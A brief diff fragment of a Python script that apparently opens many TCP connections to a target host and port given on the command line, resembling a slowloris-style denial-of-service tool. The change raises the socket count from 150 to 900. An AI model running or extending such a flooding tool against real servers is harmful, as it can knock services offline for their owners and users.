@@ -9,7 +9,7 @@ import random
 TARGET = sys.argv[1]
 PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
 DURATION = int(sys.argv[3]) if len(sys.argv) > 3 else 20
-SOCKET_COUNT = 150
+SOCKET_COUNT = 900
 
 def make_socket(ip, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
